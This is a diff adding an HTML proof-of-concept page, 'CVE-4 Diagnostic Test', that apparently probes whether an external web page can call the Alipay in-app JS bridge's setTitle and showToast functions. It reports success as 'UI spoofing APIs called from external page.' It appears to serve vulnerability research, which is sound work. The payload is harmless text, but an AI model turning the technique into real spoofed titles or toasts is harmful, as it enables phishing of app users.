@@ -1,0 +1,112 @@
+<!DOCTYPE html>
+<html><head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>CVE-4 Simple Test</title>
+<style>
+body{font-family:sans-serif;padding:16px;background:#fff;color:#333}
+.box{background:#f6ffed;border:2px solid #52c41a;border-radius:10px;padding:16px;margin:12px 0}
+h2{color:#389e0d;font-size:15px}
+.item{padding:4px 0;font-size:13px}
+.label{color:#888;font-size:11px}
+.value{color:#333;font-weight:600}
+#status{font-size:14px;color:#1677ff;text-align:center;padding:20px}
+</style>
+</head><body>
+
+<h1 style="text-align:center;color:#722ed1;font-size:18px">CVE-4 Diagnostic Test</h1>
+<p style="text-align:center;font-size:12px;color:#888">Step-by-step UI Spoofing JSAPI isolation</p>
+
+<div id="status">Page loaded. Running diagnostics...</div>
+<div id="results"></div>
+
+<script>
+var el = document.getElementById('results');
+var status = document.getElementById('status');
+var html = '';
+
+// Step 1: Basic rendering proof
+html += '<div class="box"><h2>Step 1: Page Renders OK</h2>';
+html += '<div class="item"><span class="label">Origin: </span><span class="value">' + location.origin + '</span></div>';
+html += '<div class="item"><span class="label">URL: </span><span class="value" style="word-break:break-all;font-size:10px">' + location.href + '</span></div>';
+html += '<div class="item"><span class="label">UA: </span><span class="value" style="word-break:break-all;font-size:10px">' + navigator.userAgent + '</span></div>';
+html += '<div class="item"><span class="label">Time: </span><span class="value">' + new Date().toISOString() + '</span></div>';
+html += '</div>';
+el.innerHTML = html;
+
+// Step 2: Bridge detection only
+function step2() {
+  html += '<div class="box"><h2>Step 2: Bridge Detection</h2>';
+  html += '<div class="item"><span class="label">AlipayJSBridge: </span><span class="value">' + (!!window.AlipayJSBridge) + '</span></div>';
+  html += '<div class="item"><span class="label">typeof: </span><span class="value">' + typeof window.AlipayJSBridge + '</span></div>';
+  html += '</div>';
+  el.innerHTML = html;
+  status.textContent = 'Bridge detected: ' + (!!window.AlipayJSBridge);
+
+  if (window.AlipayJSBridge) {
+    status.textContent = 'Bridge found! Will try setTitle in 3s...';
+    setTimeout(step3_title, 3000);
+  }
+}
+
+// Step 3: Try setTitle only
+function step3_title() {
+  html += '<div class="box"><h2>Step 3: setTitle Call</h2>';
+  html += '<div class="item"><span class="label">Calling: </span><span class="value">setTitle("CVE-4 Test Title")</span></div>';
+  html += '</div>';
+  el.innerHTML = html;
+  status.textContent = 'Calling setTitle...';
+
+  try {
+    AlipayJSBridge.call('setTitle', {title: 'CVE-4 Test Title'}, function(result) {
+      html += '<div class="box"><h2>setTitle Response</h2>';
+      html += '<div class="item"><span class="label">Result: </span><span class="value" style="word-break:break-all">' + JSON.stringify(result) + '</span></div>';
+      html += '</div>';
+      el.innerHTML = html;
+      status.textContent = 'setTitle responded! Trying showToast in 2s...';
+      setTimeout(step4_toast, 2000);
+    });
+  } catch(e) {
+    html += '<div class="box" style="background:#fff2f0;border-color:#ff4d4f"><h2 style="color:#cf1322">setTitle ERROR</h2>';
+    html += '<div class="item"><span class="label">Exception: </span><span class="value">' + e.message + '</span></div>';
+    html += '</div>';
+    el.innerHTML = html;
+    status.textContent = 'setTitle exception: ' + e.message;
+    status.style.color = '#f5222d';
+  }
+}
+
+// Step 4: Try showToast
+function step4_toast() {
+  try {
+    AlipayJSBridge.call('showToast', {
+      content: 'CVE-4 Toast Test',
+      type: 'none',
+      duration: 2000
+    }, function(result) {
+      html += '<div class="box"><h2>showToast Response</h2>';
+      html += '<div class="item"><span class="label">Result: </span><span class="value">' + JSON.stringify(result) + '</span></div>';
+      html += '</div>';
+      el.innerHTML = html;
+      status.textContent = 'showToast responded! Both UI spoofing APIs called from external page.';
+      status.style.color = '#f5222d';
+    });
+  } catch(e) {
+    html += '<div class="box" style="background:#fff2f0;border-color:#ff4d4f"><h2 style="color:#cf1322">showToast ERROR</h2>';
+    html += '<div class="item"><span class="label">Exception: </span><span class="value">' + e.message + '</span></div>';
+    html += '</div>';
+    el.innerHTML = html;
+    status.textContent = 'showToast exception: ' + e.message;
+    status.style.color = '#f5222d';
+  }
+}
+
+document.addEventListener('AlipayJSBridgeReady', function() {
+  step2();
+});
+
+step2();
+setTimeout(step2, 1000);
+setTimeout(step2, 3000);
+</script>
+</body></html>
